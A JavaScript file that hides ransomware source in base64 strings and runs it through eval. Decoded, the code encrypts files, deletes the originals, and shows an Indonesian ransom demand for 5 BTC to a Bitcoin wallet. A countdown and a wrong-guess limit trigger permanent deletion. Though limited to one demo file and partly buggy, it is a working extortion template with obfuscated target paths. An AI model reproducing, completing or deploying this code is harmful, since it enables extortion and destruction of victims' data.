const ガンツ = [
  'Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwpjb25zdCBwYXRoID0gcmVxdWlyZSgncGF0aCcpOwpjb25zdCBjcnlwdG8gPSByZXF1aXJlKCdjcnlwdG8nKTsKY29uc3QgcmVhZGxpbmUgPSByZXF1aXJlKCdyZWFkbGluZScpOwpjb25zdCB7IEJveCwgY29sb3JzLCBzY3JvbGxiYXIgfSA9IHJlcXVpcmUoJ2JsZXNzZWQnKTsKCmNvbnN0IOato+OBo+OCueOCvyA9IHsKICBrZXk6IEJ1ZmZlci5mcm9tKCdNekl4JywgJ2Jhc2U2NCcpLAogIHRhcmdldERpcnM6IFsKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSkVvSEFnRi9EUXduT29hRC8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSkZ3SEFnRi9EUXduTVVtZW50cy8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSlJ3Y1BpY3R1cmVzLycsICdiYXNlNjQnKS50b1N0cmluZygpLAogICAgQnVmZmVyLmZyb20oJ0wxd3NKRklNTC8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSk5vdmllcy8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSkFuZHJvaWQvJywgJ2Jhc2U2NCcpLnRvU3RyaW5nKCksCiAgICBCdWZmZXIuZnJvbSgnTDF3c0pBbmRyb2lkL2RhdGEvY29tLnRlcm11eC9maWxlcy9ob21lLycsICdiYXNlNjQnKS50b1N0cmluZygpLAogICAgQnVmZmVyLmZyb20oJ0wxd3NKdGVybXV4LmNvbS8nLCAnYmFzZTY0JykudG9TdHJpbmcoKQogIF0KfTsKCmNsYXNzIFJlYWxSYW5zb213YXJlIHsKICBjb25zdHJ1Y3RvcigpIHsKICAgIHRoaXMua2V5ID0gQnVmZmVyLmZyb20o5q2j44Gj44K544K/LmtleSwgJ2Jhc2U2NCcpOwogICAgdGhpcy50YXJnZXREaXJzID0g5q2j44Gj44K544K/LnRhcmdldERpcnM7CiAgICB0aGlzLmVuY3J5cHRlZEZpbGVzID0gW107CiAgICB0aGlzLmF0dGVtcHRzID0gMDsKICAgIHRoaXMubWF4QXR0ZW1wdHMgPSAxMDsKICAgIHRoaXMudGltZXJEdXJhdGlvbiA9IDYwMDsKICAgIHRoaXMudGltZXJBY3RpdmUgPSB0cnVlOwogICAgdGhpcy5zdGFydFRpbWUgPSBEYXRlLm5vdygpOwogICAgdGhpcy51aSA9IHRoaXMuY3JlYXRlVUkoKTsKICB9CgogIGNyZWF0ZVVJKCkgewogICAgY29uc3Qgc2NyZWVuID0gYmxlc3NlZC5zY3JlZW4oe3NtYXJ0Q1NSOiB0cnVlfSk7CiAgICBjb25zdCBncmlkID0gbmV3IGJsZXNzZWQuZ3JpZCh7cm93czogMTIsIGNvbHM6IDEyLCBzY3JlZW59KTsKCiAgICBjb25zdCBiYW5uZXJCb3ggPSBncmlkLnNldCgwLCAwLCA0LCAxMiwgYmxlc3NlZC5ib3gsIHsKICAgICAgY29udGVudDogJycsCiAgICAgIHRhZ3M6IHRydWUsCiAgICAgIHN0eWxlOiB7IGJnOiAnYmxhY2snLCBmZzogJ3JlZCcgfQogICAgfSk7CgogICAgY29uc3Qgc3RhdHVzQm94ID0gZ3JpZC5zZXQoNCwgMCwgNCwgMTIsIGJsZXNzZWQubG9nLCB7CiAgICAgIHRhZ3M6IHRydWUsCiAgICAgIHNjcm9sbGFibGU6IHRydWUsCiAgICAgIHN0eWxlOiB7IGJnOiAnYmxhY2snLCBmZzogJ3llbGxvdycgfQogICAgfSk7CgogICAgY29uc3QgaW5wdXRCb3ggPSBncmlkLnNldCg4LCAwLCAyLCAxMiwgYmxlc3NlZC50ZXh0Ym94LCB7CiAgICAgIGlucHV0T25Gb2N1czogdHJ1ZSwKICAgICAgc3R5bGU6IHsgYmc6ICdibHVlJywgZmcgOiAnd2hpdGUnIH0KICAgIH0pOwoKICAgIGlucHV0Qm94Lm9uKCdzdWJtaXQnLCB2YWx1ZSA9PiB7CiAgICAgIHRoaXMub25JbnB1dCh2YWx1ZSk7CiAgICAgIGlucHV0Qm94LmNsZWFyVmFsdWUoKTsKICAgICAgc2NyZWVuLnJlbmRlcigpOwogICAgfSk7CgogICAgc2NyZWVuLmtleShbJ2VzY2FwZScsICdxJywgJ0MtYyddLCAoKSA9PiBwcm9jZXNzLmV4aXQoMCkpOwogICAgc2NyZWVuLnJlbmRlcigpOwogICAgaW5wdXRCb3guZm9jdXMoKTsKCiAgICByZXR1cm4gewogICAgICBzY3JlZW46IHNjcmVlbiwKICAgICAgYmFubmVyQm94OiBiYW5uZXJCb3gsCiAgICAgIHN0YXR1c0JveDogc3RhdHVzQm94LAogICAgICBpbnB1dEJveDogaW5wdXRCb3gsCiAgICAgIGVtaXQ6IChldmVudCwgZGF0YSkgPT4gewogICAgICAgIGlmKGV2ZW50ID09PSAndXBkYXRlJykgdGhpcy51cGRhdGVVSShkYXRhKTsKICAgICAgICBpZihldmVudCA9PT0gJ3N0YXR1cycpIHN0YXR1c0JveC5hZGQoZGF0YSk7CiAgICAgIH0KICAgIH07CiAgfQoKICB1cGRhdGVVSShkYXRhKSB7CiAgICBjb25zdCB7IHRpbWUsIGF0dGVtcHRzIH0gPSBkYXRhOwogICAgdGhpcy51aS5iYW5uZXJCb3guc2V0Q29udGVudChgCiAgX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgICAgICAgICAgICAKIHwgIF8gXCBfXyBfIF9fXyBfIF9fXyAgXyBfX198IHwgIF9fICBfIF9fXyAgIF9fICAgCiB8IC9fKSB8IF9fLyBfYCB8IC9fIFx8IHwvIF9gIHwgLyBfIFwgLyBfYCB8IC8gXyBcIAogfCAgXyA8IChffCB8ICB8IChfKSB8IHwgKF8pIHwgfCAgXyAgPCAgX18vIAogfF8vIFxfX19fX3xffCAgXF9fXy98X3xcX18vfF98XF9fLCB8X3xcX198IHxcX198X3wKCiAgICAgICEhISB7cmVkLWZnfVBFUklOR0FUQU4gS1JJVElTey9yZWQtZmd9ICEhIQogICAgICBTZW11YSBmaWxlIEFuZGEgdGVsYWggZGllbmtyaXBzaSEKCiAgICAgIFNpc2Egd2FrdHU6ICR7dGltZX0KICAgICAgUGVyY29iYWFuIHRlcnNpc2E6ICR7YXR0ZW1wdHN9CgogICAgICBLaXJpbSA1IEJUQyBrZSB3YWxsZXQgYmVyaWt1dDoKICAgICAgYmMxcWFyMHNycnI3eGZrdnk1bDY0M2x5ZG53OXJlNTlndHp6d2Y1bWRxCgogICAgICB7cmVkLWZnfVNldGVsYWggd2FrdHUgaGFiaXMgYXRhdSAxMCBrZXNhbGFoYW4sCiAgICAgIFNFTVVBIEZJTEUgQUtBTiBESUhBUFVTIFBFUk1BTkVOISB7L3JlZC1mZ30KICAgIGApOwogICAgdGhpcy51aS5zY3JlZW4ucmVuZGVyKCk7CiAgfQoKICBvbnRpbWVyKCkgewogICAgaWYoIXRoaXMudGltZXJBY3RpdmUpIHJldHVybjsKICAgIGNvbnN0IGVsYXBzZWQgPSBNYXRoLmZsb29yKChEYXRlLm5vdygpIC0gdGhpcy5zdGFydFRpbWUpIC8gMTAwMCk7CiAgICBjb25zdCByZW1haW5pbmcgPSB0aGlzLnRpbWVyRHVyYXRpb24gLSBlbGFwc2VkOwoKICAgIGlmKHJlbWFpbmluZyA8PSAwKSB7CiAgICAgIHRoaXMuZGVsZXRlRmlsZXMoKTsKICAgICAgcHJvY2Vzcy5leGl0KDApOwogICAgfQoKICAgIGNvbnN0IG1pbnMgPSBNYXRoLmZsb29yKHJlbWFpbmluZyAvIDYwKTsKICAgIGNvbnN0IHNlY3MgPSByZW1haW5pbmcgJSA2MDsKICAgIHRoaXMudWkuZW1pdCgndXBkYXRlJywgewogICAgICB0aW1lOiBgJHttaW5zfSBtZW5pdCAke3NlY3N9IGRldGlrYCwKICAgICAgYXR0ZW1wdHM6IHRoaXMubWF4QXR0ZW1wdHMgLSB0aGlzLmF0dGVtcHRzCiAgICB9KTsKICB9CgogIGFzeW5jIGVuY3J5cHRGaWxlcygpIHsKICAgIGNvbnN0IGZpbGVzID0gdGhpcy5maW5kRmlsZXMoKTsKICAgIGZvcihjb25zdCBmaWxlIG9mIGZpbGVzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IGZzLnByb21pc2VzLnJlYWRGaWxlKGZpbGUpOwogICAgICAgIGNvbnN0IGVuY3J5cHRlZCA9IGF3YWl0IHRoaXMuZW5jcnlwdChkYXRhKTsKICAgICAgICBhd2FpdCBmcy5wcm9taXNlcy53cml0ZUZpbGUoYGZpbGV9LmVuY3J5cHRlZGAsIGVuY3J5cHRlZCk7CiAgICAgICAgYXdhaXQgZnMucHJvbWlzZXMudW5saW5rKGZpbGUpOwogICAgICAgIHRoaXMuZW5jcnlwdGVkRmlsZXMucHVzaChgZmlsZX0uZW5jcnlwdGVkYCk7CiAgICAgICAgdGhpcy51aS5lbWl0KCdzdGF0dXMnLCBgRW5rcmlwc2k6ICR7ZmlsZX1gKTsKICAgICAgfSBjYXRjaCAoZSkge30KICAgIH0KICAgIHRoaXMudWkuZW1pdCgnc3RhdHVzJywgJ0Vua3JpcHNpIHNlbGVzYWkhJyk7CiAgfQoKICBhc3luYyBkZWNyeXB0RmlsZXMoKSB7CiAgICBmb3IoY29uc3QgZmlsZSBvZiB0aGlzLmVuY3J5cHRlZEZpbGVzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgZW5jcnlwdGVkRGF0YSA9IGF3YWl0IGZzLnByb21pc2VzLnJlYWRGaWxlKGZpbGUpOwogICAgICAgIGNvbnN0IGRlY3J5cHRlZCA9IGF3YWl0IHRoaXMuZGVjcnlwdChlbmNyeXB0ZWREYXRhKTsKICAgICAgICBhd2FpdCBmcy5wcm9taXNlcy53cml0ZUZpbGUoZmlsZS5zbGljZSgwLCAtMTApLCBkZWNyeXB0ZWQpOwogICAgICAgIGF3YWl0IGZzLnByb21pc2VzLnVubGluayhmaWxlKTsKICAgICAgICB0aGlzLnVpLmVtaXQoJ3N0YXR1cycsYERla3JpcHNpOiAke2ZpbGUuc2xpY2UoMCwgLTEwKX1gKTsKICAgICAgfSBjYXRjaCAoZSkge30KICAgIH0KICAgIHRoaXMudWkuZW1pdCgnc3RhdHVzJywgJ0Rla3JpcHNpIHNlbGVzYWkhJyk7CiAgfQoKICBhc3luYyBkZWxldGVGaWxlcygpIHsKICAgIGZvcihjb25zdCBmaWxlIG9mIHRoaXMuZW5jcnlwdGVkRmlsZXMpIHsKICAgICAgdHJ5IHsKICAgICAgICBhd2FpdCBmcy5wcm9taXNlcy51bmxpbmsoZmlsZSk7CiAgICAgICAgdGhpcy51aS5lbWl0KCdzdGF0dXMnLCBgRGloYXB1czogJHtmaWxlfWApOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfQogICAgdGhpcy51aS5lbWl0KCdzdGF0dXMnLCAnRElIQVBVUyBTRUxFU0FJIScpOwogIH0KCiAgYXN5bmMgcnVuKCkgewogICAgaWYodGhpcy5lbmNyeXB0ZWRGaWxlcy5sZW5ndGggPT09IDApIHsKICAgICAgYXdhaXQgdGhpcy5lbmNyeXB0RmlsZXMoKTsKICAgIH0KCiAgICBzZXRJbnRlcnZhbCgoKSA9PiB0aGlzLm9udGltZXIoKSwgMTAwMCk7CiAgICB0aGlzLnVpLmVtaXQoJ3VwZGF0ZScsIHsKICAgICAgdGltZTogJzEwIG1lbnQgMCBkZXRpaycsCiAgICAgIGF0dGVtcHRzOiB0aGlzLm1heEF0dGVtcHRzCiAgICB9KTsKICB9CgogIG9uSW5wdXQoa2V5KSB7CiAgICBpZihrZXkgPT09ICczMjEnKSB7CiAgICAgIHRoaXMudGltZXJBY3RpdmUgPSBmYWxzZTsKICAgICAgdGhpcy5kZWNyeXB0RmlsZXMoKTsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuYXR0ZW1wdHMrKzsKICAgICAgaWYodGhpcy5hdHRlbXB0cyA+PSB0aGlzLm1heEF0dGVtcHRzKSB7CiAgICAgICAgdGhpcy5kZWxldGVGaWxlcygpOwogICAgICB9CiAgICAgIHRoaXMudWkuZW1pdCgndXBkYXRlJywgewogICAgICAgIHRpbWU6IGAke01hdGguZmxvb3IodGhpcy50aW1lckR1cmF0aW9uLzYwKX0gbWVuaXQgJHt0aGlzLnRpbWVyRHVyYXRpb24lNjB9IGRldGlrYCwKICAgICAgICBhdHRlbXB0czogdGhpcy5tYXhBdHRlbXB0cyAtIHRoaXMuYXR0ZW1wdHMKICAgICAgfSk7CiAgICB9CiAgfQoKICBmaW5kRmlsZXMoKSB7CiAgICByZXR1cm4gWycuL3Rlc3QudHh0J107IC8vIFNpbXBsZSBkZW1vIG9ubHkKICB9CgogIGVuY3J5cHQoZGF0YSkgewogICAgY29uc3QgY2lwaGVyID0gY3J5cHRvLmNyZWF0ZUNpcGhlcignYWVzLTI1Ni1jdHInLCB0aGlzLmtleSk7CiAgICByZXR1cm4gY2lwaGVyLnVwZGF0ZShkYXRhKTsKICB9CgogIGRlY3J5cHQoZGF0YSkgewogICAgY29uc3QgY2lwaGVyID0gY3J5cHRvLmNyZWF0ZURlY2lwaGVyKCdhZXMtMjU2LWN0cicsIHRoaXMua2V5KTsKICAgIHJldHVybiBjaXBoZXIudXBkZGF0ZShkYXRhKTsKICB9Cn0KCmNvbnN0IHJsID0gcmVhZGxpbmUuY3JlYXRlSW50ZXJmYWNlKHtpbnB1dDogcHJvY2Vzcy5zdGRpbiwgb3V0cHV0OiBwcm9jZXNzLnN0ZG91dH0pOwpybC5xdWVzdGlvbignQXBha2FoIEFuZGEgeWFraW4gbWVuZ2VudXRrYW4/ICdrZXRpayAiWUEiJywgYW5zd2VyID0+IHsKICBpZihhbnN3ZXIgPT09ICdZQScpIHsKICAgIGNvbnN0IHJhbnNvbXdhcmUgPSBuZXcgUmVhbFJhbnNvbXdhcmUoKTsKICAgIHJhbnNvbXdhcmUucnVuKCk7CiAgfSBlbHNlIHsKICAgIGNvbnNvbGUubG9nKCdPcGVyYXNpIGRpYmF0YWxrYW4nKTsKICAgIHByb2Nlc3MuZXhpdCgwKTsKICB9CiAgcmwuY2xvc2UoKTsKfSk7',
  'Y29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwpjb25zdCBwYXRoID0gcmVxdWlyZSgncGF0aCcpOwpjb25zdCBjcnlwdG8gPSByZXF1aXJlKCdjcnlwdG8nKTsKY29uc3QgcmVhZGxpbmUgPSByZXF1aXJlKCdyZWFkbGluZScpOwpjb25zdCB7IEJveCwgY29sb3JzLCBzY3JvbGxiYXIgfSA9IHJlcXVpcmUoJ2JsZXNzZWQnKTsKCmNvbnN0IOato+OBo+OCueOCvyA9IHsKICBrZXk6IEJ1ZmZlci5mcm9tKCdNekl4JywgJ2Jhc2U2NCcpLAogIHRhcmdldERpcnM6IFsKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSkVvSEFnRi9EUXduT29hRC8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSkZ3SEFnRi9EUXduTVVtZW50cy8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSlJ3Y1BpY3R1cmVzLycsICdiYXNlNjQnKS50b1N0cmluZygpLAogICAgQnVmZmVyLmZyb20oJ0wxd3NKRklNTC8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSk5vdmllcy8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSwKICAgIEJ1ZmZlci5mcm9tKCdMMXdzSkFuZHJvaWQvJywgJ2Jhc2U2NCcpLnRvU3RyaW5nKCksCiAgICBCdWZmZXIuZnJvbSgnTDF3c0pBbmRyb2lkL2RhdGEvY29tLnRlcm11eC9maWxlcy9ob21lLycsICdiYXNlNjQnKS50b1N0cmluZygpLAogICAgQnVmZmVyLmZyb20oJ0wxd3NKdGVybXV4LmNvbS8nLCAnYmFzZTY0JykudG9TdHJpbmcoKQogIF0KfTsKCmNsYXNzIFJlYWxSYW5zb213YXJlIHsKICBjb25zdHJ1Y3RvcigpIHsKICAgIHRoaXMua2V5ID0gQnVmZmVyLmZyb20o5q2j44Gj44K544K/LmtleSwgJ2Jhc2U2NCcpOwogICAgdGhpcy50YXJnZXREaXJzID0g5q2j44Gj44K544K/LnRhcmdldERpcnM7CiAgICB0aGlzLmVuY3J5cHRlZEZpbGVzID0gW107CiAgICB0aGlzLmF0dGVtcHRzID0gMDsKICAgIHRoaXMubWF4QXR0ZW1wdHMgPSAxMDsKICAgIHRoaXMudGltZXJEdXJhdGlvbiA9IDYwMDsKICAgIHRoaXMudGltZXJBY3RpdmUgPSB0cnVlOwogICAgdGhpcy5zdGFydFRpbWUgPSBEYXRlLm5vdygpOwogICAgdGhpcy51aSA9IHRoaXMuY3JlYXRlVUkoKTsKICB9CgogIGNyZWF0ZVVJKCkgewogICAgY29uc3Qgc2NyZWVuID0gYmxlc3NlZC5zY3JlZW4oe3NtYXJ0Q1NSOiB0cnVlfSk7CiAgICBjb25zdCBncmlkID0gbmV3IGJsZXNzZWQuZ3JpZCh7cm93czogMTIsIGNvbHM6IDEyLCBzY3JlZW59KTsKCiAgICBjb25zdCBiYW5uZXJCb3ggPSBncmlkLnNldCgwLCAwLCA0LCAxMiwgYmxlc3NlZC5ib3gsIHsKICAgICAgY29udGVudDogJycsCiAgICAgIHRhZ3M6IHRydWUsCiAgICAgIHN0eWxlOiB7IGJnOiAnYmxhY2snLCBmZzogJ3JlZCcgfQogICAgfSk7CgogICAgY29uc3Qgc3RhdHVzQm94ID0gZ3JpZC5zZXQoNCwgMCwgNCwgMTIsIGJsZXNzZWQubG9nLCB7CiAgICAgIHRhZ3M6IHRydWUsCiAgICAgIHNjcm9sbGFibGU6IHRydWUsCiAgICAgIHN0eWxlOiB7IGJnOiAnYmxhY2snLCBmZzogJ3llbGxvdycgfQogICAgfSk7CgogICAgY29uc3QgaW5wdXRCb3ggPSBncmlkLnNldCg4LCAwLCAyLCAxMiwgYmxlc3NlZC50ZXh0Ym94LCB7CiAgICAgIGlucHV0T25Gb2N1czogdHJ1ZSwKICAgICAgc3R5bGU6IHsgYmc6ICdibHVlJywgZmcgOiAnd2hpdGUnIH0KICAgIH0pOwoKICAgIGlucHV0Qm94Lm9uKCdzdWJtaXQnLCB2YWx1ZSA9PiB7CiAgICAgIHRoaXMub25JbnB1dCh2YWx1ZSk7CiAgICAgIGlucHV0Qm94LmNsZWFyVmFsdWUoKTsKICAgICAgc2NyZWVuLnJlbmRlcigpOwogICAgfSk7CgogICAgc2NyZWVuLmtleShbJ2VzY2FwZScsICdxJywgJ0MtYyddLCAoKSA9PiBwcm9jZXNzLmV4aXQoMCkpOwogICAgc2NyZWVuLnJlbmRlcigpOwogICAgaW5wdXRCb3guZm9jdXMoKTsKCiAgICByZXR1cm4gewogICAgICBzY3JlZW46IHNjcmVlbiwKICAgICAgYmFubmVyQm94OiBiYW5uZXJCb3gsCiAgICAgIHN0YXR1c0JveDogc3RhdHVzQm94LAogICAgICBpbnB1dEJveDogaW5wdXRCb3gsCiAgICAgIGVtaXQ6IChldmVudCwgZGF0YSkgPT4gewogICAgICAgIGlmKGV2ZW50ID09PSAndXBkYXRlJykgdGhpcy51cGRhdGVVSShkYXRhKTsKICAgICAgICBpZihldmVudCA9PT0gJ3N0YXR1cycpIHN0YXR1c0JveC5hZGQoZGF0YSk7CiAgICAgIH0KICAgIH07CiAgfQoKICB1cGRhdGVVSShkYXRhKSB7CiAgICBjb25zdCB7IHRpbWUsIGF0dGVtcHRzIH0gPSBkYXRhOwogICAgdGhpcy51aS5iYW5uZXJCb3guc2V0Q29udGVudChgCiAgX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgICAgICAgICAgICAKIHwgIF8gXCBfXyBfIF9fXyBfIF9fXyAgXyBfX198IHwgIF9fICBfIF9fXyAgIF9fICAgCiB8IC9fKSB8IF9fLyBfYCB8IC9fIFx8IHwvIF9gIHwgLyBfIFwgLyBfYCB8IC8gXyBcIAogfCAgXyA8IChffCB8ICB8IChfKSB8IHwgKF8pIHwgfCAgXyAgPCAgX18vIAogfF8vIFxfX19fX3xffCAgXF9fXy98X3xcX18vfF98XF9fLCB8X3xcX198IHxcX198X3wKCiAgICAgICEhISB7cmVkLWZnfVBFUklOR0FUQU4gS1JJVElTey9yZWQtZmd9ICEhIQogICAgICBTZW11YSBmaWxlIEFuZGEgdGVsYWggZGllbmtyaXBzaSEKCiAgICAgIFNpc2Egd2FrdHU6ICR7dGltZX0KICAgICAgUGVyY29iYWFuIHRlcnNpc2E6ICR7YXR0ZW1wdHN9CgogICAgICBLaXJpbSA1IEJUQyBrZSB3YWxsZXQgYmVyaWt1dDoKICAgICAgYmMxcWFyMHNycnI3eGZrdnk1bDY0M2x5ZG53OXJlNTlndHp6d2Y1bWRxCgogICAgICB7cmVkLWZnfVNldGVsYWggd2FrdHUgaGFiaXMgYXRhdSAxMCBrZXNhbGFoYW4sCiAgICAgIFNFTVVBIEZJTEUgQUtBTiBESUhBUFVTIFBFUk1BTkVOISB7L3JlZC1mZ30KICAgIGApOwogICAgdGhpcy51aS5zY3JlZW4ucmVuZGVyKCk7CiAgfQoKICBvbnRpbWVyKCkgewogICAgaWYoIXRoaXMudGltZXJBY3RpdmUpIHJldHVybjsKICAgIGNvbnN0IGVsYXBzZWQgPSBNYXRoLmZsb29yKChEYXRlLm5vdygpIC0gdGhpcy5zdGFydFRpbWUpIC8gMTAwMCk7CiAgICBjb25zdCByZW1haW5pbmcgPSB0aGlzLnRpbWVyRHVyYXRpb24gLSBlbGFwc2VkOwoKICAgIGlmKHJlbWFpbmluZyA8PSAwKSB7CiAgICAgIHRoaXMuZGVsZXRlRmlsZXMoKTsKICAgICAgcHJvY2Vzcy5leGl0KDApOwogICAgfQoKICAgIGNvbnN0IG1pbnMgPSBNYXRoLmZsb29yKHJlbWFpbmluZyAvIDYwKTsKICAgIGNvbnN0IHNlY3MgPSByZW1haW5pbmcgJSA2MDsKICAgIHRoaXMudWkuZW1pdCgndXBkYXRlJywgewogICAgICB0aW1lOiBgJHttaW5zfSBtZW5pdCAke3NlY3N9IGRldGlrYCwKICAgICAgYXR0ZW1wdHM6IHRoaXMubWF4QXR0ZW1wdHMgLSB0aGlzLmF0dGVtcHRzCiAgICB9KTsKICB9CgogIGFzeW5jIGVuY3J5cHRGaWxlcygpIHsKICAgIGNvbnN0IGZpbGVzID0gdGhpcy5maW5kRmlsZXMoKTsKICAgIGZvcihjb25zdCBmaWxlIG9mIGZpbGVzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IGZzLnByb21pc2VzLnJlYWRGaWxlKGZpbGUpOwogICAgICAgIGNvbnN0IGVuY3J5cHRlZCA9IGF3YWl0IHRoaXMuZW5jcnlwdChkYXRhKTsKICAgICAgICBhd2FpdCBmcy5wcm9taXNlcy53cml0ZUZpbGUoYGZpbGV9LmVuY3J5cHRlZGAsIGVuY3J5cHRlZCk7CiAgICAgICAgYXdhaXQgZnMucHJvbWlzZXMudW5saW5rKGZpbGUpOwogICAgICAgIHRoaXMuZW5jcnlwdGVkRmlsZXMucHVzaChgZmlsZX0uZW5jcnlwdGVkYCk7CiAgICAgICAgdGhpcy51aS5lbWl0KCdzdGF0dXMnLCBgRW5rcmlwc2k6ICR7ZmlsZX1gKTsKICAgICAgfSBjYXRjaCAoZSkge30KICAgIH0KICAgIHRoaXMudWkuZW1pdCgnc3RhdHVzJywgJ0Vua3JpcHNpIHNlbGVzYWkhJyk7CiAgfQoKICBhc3luYyBkZWNyeXB0RmlsZXMoKSB7CiAgICBmb3IoY29uc3QgZmlsZSBvZiB0aGlzLmVuY3J5cHRlZEZpbGVzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgZW5jcnlwdGVkRGF0YSA9IGF3YWl0IGZzLnByb21pc2VzLnJlYWRGaWxlKGZpbGUpOwogICAgICAgIGNvbnN0IGRlY3J5cHRlZCA9IGF3YWl0IHRoaXMuZGVjcnlwdChlbmNyeXB0ZWREYXRhKTsKICAgICAgICBhd2FpdCBmcy5wcm9taXNlcy53cml0ZUZpbGUoZmlsZS5zbGljZSgwLCAtMTApLCBkZWNyeXB0ZWQpOwogICAgICAgIGF3YWl0IGZzLnByb21pc2VzLnVubGluayhmaWxlKTsKICAgICAgICB0aGlzLnVpLmVtaXQoJ3N0YXR1cycsYERla3JpcHNpOiAke2ZpbGUuc2xpY2UoMCwgLTEwKX1gKTsKICAgICAgfSBjYXRjaCAoZSkge30KICAgIH0KICAgIHRoaXMudWkuZW1pdCgnc3RhdHVzJywgJ0Rla3JpcHNpIHNlbGVzYWkhJyk7CiAgfQoKICBhc3luYyBkZWxldGVGaWxlcygpIHsKICAgIGZvcihjb25zdCBmaWxlIG9mIHRoaXMuZW5jcnlwdGVkRmlsZXMpIHsKICAgICAgdHJ5IHsKICAgICAgICBhd2FpdCBmcy5wcm9taXNlcy51bmxpbmsoZmlsZSk7CiAgICAgICAgdGhpcy51aS5lbWl0KCdzdGF0dXMnLCBgRGloYXB1czogJHtmaWxlfWApOwogICAgICB9IGNhdGNoIChlKSB7fQogICAgfQogICAgdGhpcy51aS5lbWl0KCdzdGF0dXMnLCAnRElIQVBVUyBTRUxFU0FJIScpOwogIH0KCiAgYXN5bmMgcnVuKCkgewogICAgaWYodGhpcy5lbmNyeXB0ZWRGaWxlcy5sZW5ndGggPT09IDApIHsKICAgICAgYXdhaXQgdGhpcy5lbmNyeXB0RmlsZXMoKTsKICAgIH0KCiAgICBzZXRJbnRlcnZhbCgoKSA9PiB0aGlzLm9udGltZXIoKSwgMTAwMCk7CiAgICB0aGlzLnVpLmVtaXQoJ3VwZGF0ZScsIHsKICAgICAgdGltZTogJzEwIG1lbnQgMCBkZXRpaycsCiAgICAgIGF0dGVtcHRzOiB0aGlzLm1heEF0dGVtcHRzCiAgICB9KTsKICB9CgogIG9uSW5wdXQoa2V5KSB7CiAgICBpZihrZXkgPT09ICczMjEnKSB7CiAgICAgIHRoaXMudGltZXJBY3RpdmUgPSBmYWxzZTsKICAgICAgdGhpcy5kZWNyeXB0RmlsZXMoKTsKICAgIH0gZWxzZSB7CiAgICAgIHRoaXMuYXR0ZW1wdHMrKzsKICAgICAgaWYodGhpcy5hdHRlbXB0cyA+PSB0aGlzLm1heEF0dGVtcHRzKSB7CiAgICAgICAgdGhpcy5kZWxldGVGaWxlcygpOwogICAgICB9CiAgICAgIHRoaXMudWkuZW1pdCgndXBkYXRlJywgewogICAgICAgIHRpbWU6IGAke01hdGguZmxvb3IodGhpcy50aW1lckR1cmF0aW9uLzYwKX0gbWVuaXQgJHt0aGlzLnRpbWVyRHVyYXRpb24lNjB9IGRldGlrYCwKICAgICAgICBhdHRlbXB0czogdGhpcy5tYXhBdHRlbXB0cyAtIHRoaXMuYXR0ZW1wdHMKICAgICAgfSk7CiAgICB9CiAgfQoKICBmaW5kRmlsZXMoKSB7CiAgICByZXR1cm4gWycuL3Rlc3QudHh0J107IC8vIFNpbXBsZSBkZW1vIG9ubHkKICB9CgogIGVuY3J5cHQoZGF0YSkgewogICAgY29uc3QgY2lwaGVyID0gY3J5cHRvLmNyZWF0ZUNpcGhlcignYWVzLTI1Ni1jdHInLCB0aGlzLmtleSk7CiAgICByZXR1cm4gY2lwaGVyLnVwZGF0ZShkYXRhKTsKICB9CgogIGRlY3J5cHQoZGF0YSkgewogICAgY29uc3QgY2lwaGVyID0gY3J5cHRvLmNyZWF0ZURlY2lwaGVyKCdhZXMtMjU2LWN0cicsIHRoaXMua2V5KTsKICAgIHJldHVybiBjaXBoZXIudXBkYGF0ZShkYXRhKTsKICB9Cn0KCmNvbnN0IHJsID0gcmVhZGxpbmUuY3JlYXRlSW50ZXJmYWNlKHtpbnB1dDogcHJvY2Vzcy5zdGRpbiwgb3V0cHV0OiBwcm9jZXNzLnN0ZG91dH0pOwpybC5xdWVzdGlvbignQXBha2FoIEFuZGEgeWFraW4gbWVuZ2VudXRrYW4/ICdrZXRpayAiWUEiJywgYW5zd2VyID0+IHsKICBpZihhbnN3ZXIgPT09ICdZQScpIHsKICAgIGNvbnN0IHJhbnNvbXdhcmUgPSBuZXcgUmVhbFJhbnNvbXdhcmUoKTsKICAgIHJhbnNvbXdhcmUucnVuKCk7CiAgfSBlbHNlIHsKICAgIGNvbnNvbGUubG9nKCdPcGVyYXNpIGRpYmF0YWxrYW4nKTsKICAgIHByb2Nlc3MuZXhpdCgwKTsKICB9CiAgcmwuY2xvc2UoKTsKfSk7'
];

function 復号化(data) {
  return Buffer.from(data, 'base64').toString();
}

function 実行(index) {
  eval(復号化(ガンツ[index]));
}

実行(0);